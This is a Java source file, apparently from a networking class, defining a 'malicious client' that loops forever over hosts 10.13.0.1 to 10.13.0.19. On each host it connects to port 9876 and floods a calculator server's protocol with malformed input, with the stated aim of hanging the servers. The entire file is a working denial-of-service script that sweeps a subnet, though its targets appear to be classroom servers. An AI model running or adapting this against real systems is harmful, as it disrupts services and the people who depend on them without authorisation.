import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.net.InetSocketAddress;
import java.net.Socket;

public class ClienteMaligno{
	
	public void colgar(String ip) throws IOException{
		InetSocketAddress servidor=
				new InetSocketAddress(ip, 9876);
		Socket socket=new Socket();
		socket.connect(servidor, 2500);
		InputStream is=socket.getInputStream();
		BufferedReader bfr=
				ClienteCalculo.getBufferedReader(
						is);
		OutputStream os=socket.getOutputStream();
		PrintWriter pw;
		pw=ClienteCalculo.getPrintWriter(os);
		for (int i=0;i<100;i++){
			pw.println("+++++");
			pw.println("aa");
			pw.println("bb");
			pw.println("bb");
			pw.println("***");
			pw.println("aa");
			pw.println("bb");
			pw.flush();
			for (int j=0;j<20;j++){
				pw.print(j);
			}
			pw.println();
			pw.flush();
			bfr.readLine();
		}
	}
	public static void darPasada(){
		for (int i=1;i<20;i++){
			ClienteMaligno conexion;
			conexion=new ClienteMaligno();
			
			System.out.println(
				"Colgando 10.13.0."+i);
			try {
				conexion.colgar("10.13.0."+i);
			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}
	}
	public static void main(String[] args) {
		while (true){
				darPasada();
		}

	}

}
